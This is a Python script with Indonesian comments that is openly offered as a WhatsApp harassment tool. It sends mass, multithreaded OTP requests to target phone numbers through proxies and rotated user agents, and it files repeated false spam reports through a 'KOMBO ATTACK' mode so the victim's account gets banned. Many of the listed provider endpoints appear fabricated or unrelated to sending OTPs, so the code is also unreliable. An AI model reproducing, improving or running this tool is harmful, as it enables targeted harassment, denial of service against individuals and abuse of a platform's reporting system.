#!/usr/bin/env python3
# SPAM OTP + REPOT WHATSAPP
# @makloYapitpp for NityDizz 💮

import requests, time, random, os, re
from concurrent.futures import ThreadPoolExecutor

# ========================================
# 🔥 KONFIGURASI (GANTI SESUAI!)
# ========================================

THREAD = 100   # Jumlah thread
LOOP = 100     # Jumlah spam
DELAY = 0.1    # Jeda spam
# ========================================
# 📡 PROVIDER OTP (GRATIS! NO API KEY!)
# ========================================

PROVIDER = [
    {"name": "WhatsApp Web", "url": "https://web.whatsapp.com/sendcode", "method": "POST", "data": {"platform": "web"}},
    {"name": "TempMail Plus", "url": "https://tempmail.plus/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Receive", "url": "https://receive-smss.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "Text Verified", "url": "https://textverified.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSPool", "url": "https://smspool.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Activate", "url": "https://sms-activate.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "OnlineSim", "url": "https://onlinesim.ru/free/api/getNum.php?country=6&service=whatsapp", "method": "GET"},
    {"name": "SMSHub", "url": "https://smshub.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "TextNow", "url": "https://textnow.com/api/free/phone/whatsapp", "method": "GET"},
    {"name": "SMS24", "url": "https://sms24.me/free/api/phone/whatsapp", "method": "GET"},
    {"name": "FreeSMS", "url": "https://freesms.cc/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "TempNumber", "url": "https://tempnumber.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "BurnerSMS", "url": "https://burnersms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "DisposableSMS", "url": "https://disposablesms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "VirtualSMS", "url": "https://virtualsms.com/api/phone/indonesia/whatsapp", "method": "GET"},
]

# ========================================
# 🚨 REPORT WHATSAPP
# ========================================

REPOT = [
    {"name": "WhatsApp Report", "url": "https://www.whatsapp.com/contact/submit", "data": {"report_type": "spam"}},
    {"name": "WhatsApp Abuse", "url": "https://api.whatsapp.com/report/abuse", "data": {"reason": "spam"}},
    {"name": "WhatsApp Block", "url": "https://web.whatsapp.com/block", "data": {"action": "block"}},
]

# ========================================
# 🔧 FUNGSI
# ========================================

def get_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Linux; Android 13) Chrome/120.0.0.0 Mobile",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Safari/604.1",
        ]),
        "Accept": "text/html,*/*",
        "Accept-Language": "id-ID,id;q=0.9",
        "Connection": "keep-alive",
    }

def get_proxy():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                p = [x.strip() for x in f if x.strip() and not x.startswith("#")]
                if p:
                    return {"http": f"http://{random.choice(p)}", "https": f"http://{random.choice(p)}"}
    except:
        return None

def kirim_otp(nomer, provider):
    """Kirim OTP ke nomer target"""
    try:
        nomer = f"62{nomer}" if not nomer.startswith("62") else nomer
        headers = get_headers()
        proxy = get_proxy()
        
        if provider["method"] == "GET":
            r = requests.get(provider["url"], headers=headers, proxies=proxy, timeout=5)
        else:
            data = provider.get("data", {}).copy()
            data["phone"] = nomer
            r = requests.post(provider["url"], json=data, headers=headers, proxies=proxy, timeout=5)
        
        if r.status_code in [200, 201, 202, 204]:
            print(f"✅ [{provider['name']}] OTP KE {nomer}")
            return True
        return False
    except:
        return False

def report(nomer):
    """Report nomer target biar kena ban"""
    try:
        nomer = f"62{nomer}" if not nomer.startswith("62") else nomer
        headers = get_headers()
        proxy = get_proxy()
        
        for r in REPOT:
            data = r["data"].copy()
            data["phone"] = nomer
            req = requests.post(r["url"], json=data, headers=headers, proxies=proxy, timeout=5)
            if req.status_code in [200, 201, 202, 204]:
                print(f"⚠️ REPORT {nomer} BERHASIL")
                return True
        return False
    except:
        return False

def spam_otp(nomer_list):
    """SPAM OTP MASSAL"""
    print(f"\n🚀 SPAM OTP KE {len(nomer_list)} NOMER...")
    print(f"🔥 {len(PROVIDER)} PROVIDER | {THREAD} THREAD\n")
    
    with ThreadPoolExecutor(max_workers=THREAD) as ex:
        futures = []
        for n in nomer_list:
            for p in PROVIDER:
                futures.append(ex.submit(kirim_otp, n, p))
        
        total = len(futures)
        done = 0
        for f in futures:
            f.result()
            done += 1
            if done % 10 == 0:
                print(f"📊 {done}/{total} DONE")
    
    print(f"\n✅ SELESAI! {done}/{total}")

def combo(nomer):
    """KOMBO ATTACK OTP + REPORT"""
    print(f"\n💥 KOMBO ATTACK DI {nomer} SEBANYAK {LOOP}X!\n")
    
    for i in range(LOOP):
        print(f"\n🔥 ROUND {i+1}/{LOOP}")
        
        # Kirim OTP
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(kirim_otp, nomer, p) for p in PROVIDER[:20]]
            for f in futures:
                f.result()
        
        # Kirim Report
        report(nomer)
        
        time.sleep(DELAY)
        if (i+1) % 10 == 0:
            print(f"📊 {i+1} ROUND SELESAI!")

# ========================================
# 🎯 MAIN MENU
# ========================================

def main():
    os.system("clear" if os.name == "posix" else "cls")
    
    print("""
╔═══════════════════════════════════════╗
║   🔥 SPAM OTP + REPOT WA 🔥           ║
║   👑 @Makloyaput for Monzap              ║
╚═══════════════════════════════════════╝
    
[1] SPAM OTP MASSAL
[2] KOMBO ATTACK (OTP + REPORT)
[3] REPORT MASSAL
[4] EXIT
    """)
    
    pilih = input("⚡ Pilih: ")
    
    if pilih == "1":
        nomer = input("📱 Nomer (pisah koma): ").split(",")
        nomer = [x.strip() for x in nomer if x.strip()]
        spam_otp(nomer)
    
    elif pilih == "2":
        nomer = input("📱 Nomer target: ").strip()
        combo(nomer)
    
    elif pilih == "3":
        nomer = input("📱 Nomer (pisah koma): ").split(",")
        nomer = [x.strip() for x in nomer if x.strip()]
        with ThreadPoolExecutor(max_workers=50) as ex:
            list(ex.map(report, nomer))
        print("✅ REPORT SELESAI!")
    
    else:
        print("✌️ BYE TUAN!")

if __name__ == "__main__":
    main()